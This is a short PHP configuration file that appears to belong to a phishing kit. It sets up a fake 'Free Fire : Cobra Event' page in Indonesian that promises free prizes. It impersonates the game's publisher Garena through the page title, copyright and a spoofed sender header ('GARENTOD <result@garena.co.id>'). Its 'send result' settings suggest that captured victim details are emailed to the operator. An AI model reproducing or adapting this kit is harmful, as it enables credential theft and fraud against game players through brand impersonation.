<?php
// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
date_default_timezone_set('Asia/Jakarta');
$jamasuk = date('l, d-m-Y h:i:s');

//KONTROL UNTUK DESKRIPSI HALAMAN
$title = 'Free Fire : Cobra Event';
$description = 'Cobra Event Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!';
$copyright = 'FREE FIRE';
$theme = '#000';
$image = 'https://g.top4top.io/s_18883ujz60.png';
$icon = 'https://g.top4top.io/s_18883ujz60.png';

// KONTROL UNTUK HALAMAN KIRIM RESULT
$author = 'garena';
$sender = 'From: GARENTOD <result@garena.co.id>';
?>